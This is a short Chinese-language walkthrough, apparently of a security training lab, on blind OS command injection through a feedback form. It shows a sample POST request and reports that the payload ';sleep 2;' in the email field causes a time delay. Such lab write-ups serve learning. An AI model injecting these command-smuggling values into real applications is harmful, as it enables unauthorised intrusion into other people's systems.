# 实验：具有时间延迟的盲注 OS 命令注入

本实验在反馈功能中包含一个盲注操作系统命令注入漏洞。

应用程序执行一个包含用户提供的详细信息的 shell 命令。该命令的输出不会在响应中返回。

为了解决本实验，请利用盲注操作系统命令注入漏洞导致 10 秒的延迟。

## 步骤

探测
- 使用反馈功能

    ```http
    POST /feedback/submit HTTP/2

    csrf=vWr5Y1McWgIJ4JSSXhok6jQQKrrgpF46&name=a&email=a%40b&subject=c&message=d
    ```

- 使用 `;sleep 2;` 测试所有 post 请求体参数
    - email 字段成功触发时间延迟
